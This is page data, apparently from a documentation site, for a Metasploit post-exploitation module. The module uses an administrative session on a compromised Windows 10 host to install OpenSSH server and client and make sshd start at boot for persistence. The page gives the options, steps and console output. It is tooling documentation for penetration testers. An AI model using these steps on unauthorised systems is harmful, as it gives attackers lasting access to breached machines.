{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/windows/manage/install_ssh","result":{"data":{"moduleMetadataJson":{"id":"c8f04a85-9f7e-557f-9077-9713836dbfd6","name":"Install OpenSSH for Windows","fullname":"post/windows/manage/install_ssh","description":"This module installs OpenSSH server and client for Windows using PowerShell.\n                        SSH on Windows can provide pentesters persistent access to a secure interactive terminal, interactive filesystem access, and port forwarding over SSH.","rank":300,"fields":{"detailsSlug":"/modules/details/post/windows/manage/install_ssh","documentationSlug":"/modules/documentation/post/windows/manage/install_ssh"},"documentation":{"html":"<h2 id=\"creating-a-testing-environment\" style=\"position:relative;\"><a href=\"#creating-a-testing-environment\" aria-label=\"creating a testing environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating A Testing Environment</h2>\n<p>To use this module you need an administrative Meterpreter or shell session on a Windows 10, 1809 release or higher.</p>\n<p>This module has been tested against:</p>\n<ol>\n<li>Windows 10, 1903.</li>\n</ol>\n<p>This module was not tested against, but may work against:</p>\n<ol>\n<li>Windows 10, 1809 and above.</li>\n</ol>\n<p>Versions prior to Windows 10 are not supported.</p>\n<h2 id=\"module-options\" style=\"position:relative;\"><a href=\"#module-options\" aria-label=\"module options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Module Options</h2>\n<ul>\n<li><strong>INSTALL_SERVER</strong> - Install OpenSSH.Server for Windows (default: true)</li>\n<li><strong>INSTALL_CLIENT</strong> - Install OpenSSH.Client for Windows (default: true)</li>\n<li><strong>UNINSTALL_SERVER</strong> - Uninstall OpenSSH.Server for Windows (default: false)</li>\n<li><strong>UNINSTALL_CLIENT</strong> - Uninstall OpenSSH.Client for Windows (default: false)</li>\n<li><strong>SERVER_VER</strong> - OpenSSH.Server version (default \"OpenSSH.Server<del></del>0.0.1.0\")</li>\n<li><strong>CLIENT_VER</strong> - OpenSSH.Client version (default \"OpenSSH.Client<del></del>0.0.1.0\")</li>\n<li><strong>AUTOSTART</strong> - Sets sshd service to startup automatically at system boot for persistence (default: true)</li>\n</ul>\n<h3 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h3>\n<ol>\n<li>Start msfconsole</li>\n<li>Obtain a meterpreter or shell session</li>\n<li>Do: <code class=\"language-text\">use post/windows/manage/install_ssh</code></li>\n<li>Do: <code class=\"language-text\">set session #</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>Open a new terminal and test SSH access: <code class=\"language-text\">ssh user@10.10.10.10</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"install-openssh-on-windows\" style=\"position:relative;\"><a href=\"#install-openssh-on-windows\" aria-label=\"install openssh on windows permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Install OpenSSH on Windows</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  msf5 &gt; use post/windows/manage/install_ssh \n  msf5 post(windows/manage/install_ssh) &gt; set SESSION 1 \n  SESSION =&gt; 1\n  msf5 post(windows/manage/install_ssh) &gt; exploit \n\n  [*] Installing OpenSSH.Server\n  [*] Installing OpenSSH.Client\n  [*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Utilities such as ssh, sftp, and sshfs may be used over the Windows SSH session.\nWhen combined with capabilities such as SSH forwarding, SSH on Windows can provide pentesters excellent utility and flexibility.</p>\n<h3 id=\"uninstall-openssh-on-windows\" style=\"position:relative;\"><a href=\"#uninstall-openssh-on-windows\" aria-label=\"uninstall openssh on windows permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Uninstall OpenSSH on Windows</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  msf5 &gt; use post/windows/manage/install_ssh \n  msf5 post(windows/manage/install_ssh) &gt; set SESSION 1 \n  SESSION =&gt; 1\n  msf5 post(windows/manage/install_ssh) &gt; set INSTALL_CLIENT false \n  INSTALL_CLIENT =&gt; false\n  msf5 post(windows/manage/install_ssh) &gt; set INSTALL_SERVER false \n  INSTALL_SERVER =&gt; false\n  msf5 post(windows/manage/install_ssh) &gt; set UNINSTALL_CLIENT true \n  UNINSTALL_CLIENT =&gt; true\n  msf5 post(windows/manage/install_ssh) &gt; set UNINSTALL_SERVER true \n  UNINSTALL_SERVER =&gt; true\n  msf5 post(windows/manage/install_ssh) &gt; exploit \n\n  [*] Uninstalling OpenSSH.Server\n  [*] Uninstalling OpenSSH.Client\n  [*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"c8f04a85-9f7e-557f-9077-9713836dbfd6"}}}